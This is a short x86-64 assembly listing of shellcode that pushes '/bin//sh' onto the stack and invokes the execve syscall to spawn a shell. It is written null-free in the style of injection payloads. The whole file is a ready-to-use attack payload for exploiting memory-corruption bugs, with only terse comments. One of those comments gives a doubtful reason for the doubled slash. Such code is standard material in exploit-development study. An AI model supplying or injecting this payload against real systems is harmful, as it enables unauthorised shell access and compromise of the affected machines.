bits 64

section .text
global _start
_start:
    xor eax,eax ; generate null byte
    push rax ; push null byte
    mov rdx, 0x68732f2f6e69622f ; /bin//sh written in little-endian byte order,using double slash due to stack alignment constraints
    push rdx
    mov rdi, rsp ; rsp now points to /bin//sh\0
    push rax ; NULL byte
    push rdi
    mov rsi, rsp ; rsp now points to starting address of /bin//sh\0
    xor edx,edx ; envp NULL
    mov al, 59 ; execv syscall
    syscall 
    mov al, 60 ; exit syscall
    xor rdi, rdi
    syscall
